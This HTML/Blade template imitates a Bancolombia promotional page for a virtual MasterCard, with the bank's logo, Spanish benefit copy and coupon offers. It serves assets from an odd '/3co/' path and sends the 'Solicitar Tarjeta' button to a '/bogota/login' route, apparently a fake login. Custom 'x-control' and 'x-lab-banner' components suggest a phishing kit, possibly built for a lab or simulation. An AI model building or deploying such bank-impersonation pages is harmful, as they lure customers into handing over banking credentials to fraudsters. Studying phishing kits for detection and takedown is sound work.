<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/3co/css/style.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Bancolombia</title>
    <style>
        /* Definición de fuentes personalizadas */
        @font-face {
            font-family: 'CIBFont';
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                 url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
            font-display: swap;
        }

        @font-face {
            font-family: 'OpenSans';
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                 url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
            font-display: swap;
        }

        /* Estilos para el carrusel */
        .carousel-container {
            width: 100%;
            overflow: hidden;
            position: relative;
        }

        .carousel-track {
            display: flex;
            transition: transform 0.5s ease-in-out;
        }

        .carousel-slide {
            flex: 0 0 100%;
            width: 100%;
        }

        .carousel-nav {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .carousel-indicator {
            width: 40px;
            height: 10px;
            border-radius: 20%;
            background-color: #000000;
            margin: 0 5px;
            cursor: pointer;
        }

        .carousel-indicator.active {
            background-color: #fdda24;
        }

        .carousel-btn {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background-color: rgba(0, 72, 132, 0.7);
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            z-index: 10;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .carousel-btn:hover {
            background-color: #fdda24;
        }

        .carousel-btn-prev {
            left: 10px;
        }

        .carousel-btn-next {
            right: 10px;
        }

        /* Ocultar botones en móviles para no interferir con el swipe */
        @media (max-width: 768px) {
            .carousel-btn {
                display: none;
            }
        }
    </style>
    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
</head>
<body class="w-screen bg-[#f7f7f7]">
<x-lab-banner />
    <header class="w-full flex py-4 px-4  items-center justify-center bg-white">
        <div class="w-[98%] flex justify-between items-center">
            <img src="/3co/assets/logo.png" class="w-[50%] object-contain" alt="">
            <div class="flex items-center">
                <p class="font-[OpenSans]">Menú</p>
                <div class="text-black ml-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-three-dots-vertical" viewBox="0 0 16 16">
                        <path d="M9.5 13a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m0-5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m0-5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0"/>
                    </svg>
                </div>
            </div>
        </div>
    </header>
    <main class="w-full flex flex-col justify-center items-center">

        <div class="w-[98%] bg-white mb-8 py-5 px-4">
            <p class="text-[25px] font-[CIBFont]">Tarjeta de Crédito Única Virtual MasterCard Bancolombia</p>
            <p class="text-[15px] font-[OpenSans]">Tarjeta 100% virtual que podrás usar inmediatamente en compras por internet y en comercios físicos a través de tus dispositivos electrónicos con App Bancolombia, Apple Pay, Billetera de Google, Garmin Pay, entre otras.</p>
            <button onclick="window.location.href='/bogota/login'" class="flex items-center mt-2 py-2 px-5 rounded-full bg-[#fdda24]">
                <p class="text-black text-[15px] font-[OpenSans]">Solicitar Tarjeta</p>
                <div class="text-black">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-right" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"/>
                    </svg>
                </div>
            </button>

            <div class="pt-2">
                <img src="/3co/assets/card-virtual-hero-banner.png" class="w-full object-cover" alt="">
            </div>
        </div>

        <div class="mt-5 w-full">
            <p class="w-full text-center text-[25px] font-[CIBFont]">Beneficios</p>

            <div class="carousel-container">
                <div class="carousel-track" id="carousel-track">
                    <!-- Slide 1 -->
                    <div class="carousel-slide">
                        <div class="w-full flex  flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-cards.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Puedes comprar de inmediato</p>
                                    <p class="font-[OpenSans] text-[13px]">Compra en línea con los datos de tu tarjeta o paga en comercios físicos con Apple Pay o Google Pay.</p>
                                </div>
                            </div>
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-tag-sale.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Ofertas y descuentos</p>
                                    <p class="font-[OpenSans] text-[13px]">Disfruta ofertas exclusivas en tus marcas favoritas. Todos los fines de semana una oferta diferente.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Slide 2 -->
                    <div class="carousel-slide">
                        <div class="w-full flex flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-puntos-colombia.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Puntos Colombia</p>
                                    <p class="font-[OpenSans] text-[13px]">Regístrate, acumula y redime tus puntos en lo que más te gusta.</p>
                                </div>
                            </div>
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-hand-holding-cash.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Avances</p>
                                    <p class="font-[OpenSans] text-[13px]">Solicítalos en la app. Hasta por el 100% del cupo por transferencia a una cuenta Bancolombia.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Slide 3 -->
                    <div class="carousel-slide">
                        <div class="w-full flex flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-briefcase-medical.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">$25.000 en Farmatodo</p>
                                    <p class="font-[OpenSans] text-[13px]">Usa 2 veces al mes el cupón MASTER01 y recibe $25.000 de descuento en compras iguales o superiores a $100.000.</p>
                                </div>
                            </div>
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-coffee.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">25% en Tostao</p>
                                    <p class="font-[OpenSans] text-[13px]">Paga tus antojos con 25% de descuento de lunes a viernes por compras iguales o superiores a $15.000.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Slide 4 -->
                    <div class="carousel-slide">
                        <div class="w-full flex flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-mobile-check.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">10% en Mercado Libre</p>
                                    <p class="font-[OpenSans] text-[13px]">Ahorra los fines de semana con el 10% de descuento en compras superiores a $90.000.</p>
                                </div>
                            </div>
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-car.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">25% en Cabify</p>
                                    <p class="font-[OpenSans] text-[13px]">Activa tu cupón y muévete por la ciudad con 25% de descuento en tus 4 primeros viajes del mes.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Slide 5 -->
                    <div class="carousel-slide">
                        <div class="w-full flex flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-shopping-cart-plus.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Tu360 Compras</p>
                                    <p class="font-[OpenSans] text-[13px]">Disfruta beneficios exclusivos comprando en nuestro Marketplace, con tus tarjetas Bancolombia.</p>
                                </div>
                            </div>
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-globe-2.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Respaldo en todo el mundo</p>
                                    <p class="font-[OpenSans] text-[13px]">En caso de robo o pérdida, recibe asistencia para avances en efectivo o reemplazo temporal.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Slide 6 -->
                    <div class="carousel-slide">
                        <div class="w-full flex flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-store-plus.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">Descuentos en el Éxito</p>
                                    <p class="font-[OpenSans] text-[13px]">Aprovecha 30% los martes en frutas y verduras, 20% los miércoles en cortes de carne y 20% los viernes en web y app.</p>
                                </div>
                            </div>
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-motorcycle-scooter.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">30% en Parking</p>
                                    <p class="font-[OpenSans] text-[13px]">Parquea los viernes, sábados y domingos con 30% de descuento, al pagar un valor superior a $15.000.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Slide 7 -->
                    <div class="carousel-slide">
                        <div class="w-full flex flex-col gap-y-5 px-4">
                            <div class="w-full flex items-end mt-4">
                                <img src="/3co/assets/pic-car.svg" class="w-[20%] object-contain" alt="">
                                <div class="flex flex-col gap-y-4 w-[70%] ml-4">
                                    <p class="font-[CIBFont] text-[18px] font-bold">15% en Ruedaz</p>
                                    <p class="font-[OpenSans] text-[13px]">Aprovecha el plan mensual de 3 horas de parqueadero en la app con un 15% de descuento.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <button class="carousel-btn carousel-btn-prev" id="prev-btn">&#10094;</button>
                <button class="carousel-btn carousel-btn-next" id="next-btn">&#10095;</button>


                <div class="carousel-nav" id="carousel-indicators">

                </div>
            </div>
        </div>
    </main>

    <footer class="w-full mt-5 flex flex-col justify-center items-center py-15 bg-white">
        <img src="/3co/assets/logo.png" class="w-[25%] object-contain" alt="">
        <p class="mt-5">Copyright © 2025 Bancolombia</p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const track = document.getElementById('carousel-track');
            const slides = document.querySelectorAll('.carousel-slide');
            const prevBtn = document.getElementById('prev-btn');
            const nextBtn = document.getElementById('next-btn');
            const indicatorsContainer = document.getElementById('carousel-indicators');

            let currentIndex = 0;
            const slideCount = slides.length;

            // Crear indicadores
            for (let i = 0; i < slideCount; i++) {
                const indicator = document.createElement('div');
                indicator.classList.add('carousel-indicator');
                if (i === 0) indicator.classList.add('active');
                indicator.dataset.index = i;
                indicator.addEventListener('click', () => goToSlide(i));
                indicatorsContainer.appendChild(indicator);
            }

            const indicators = document.querySelectorAll('.carousel-indicator');

            function goToSlide(index) {
                if (index < 0) index = slideCount - 1;
                if (index >= slideCount) index = 0;

                track.style.transform = `translateX(-${index * 100}%)`;
                currentIndex = index;

                indicators.forEach((indicator, i) => {
                    if (i === index) {
                        indicator.classList.add('active');
                    } else {
                        indicator.classList.remove('active');
                    }
                });
            }

            prevBtn.addEventListener('click', () => goToSlide(currentIndex - 1));
            nextBtn.addEventListener('click', () => goToSlide(currentIndex + 1));
            let startX = 0;
            let endX = 0;

            track.addEventListener('touchstart', (e) => {
                startX = e.touches[0].clientX;
            }, false);

            track.addEventListener('touchmove', (e) => {
                endX = e.touches[0].clientX;
            }, false);

            track.addEventListener('touchend', () => {
                if (startX - endX > 50) {
                    goToSlide(currentIndex + 1);
                } else if (endX - startX > 50) {
                    goToSlide(currentIndex - 1);
                }
            }, false);


        });
    </script>
</body>
</html>
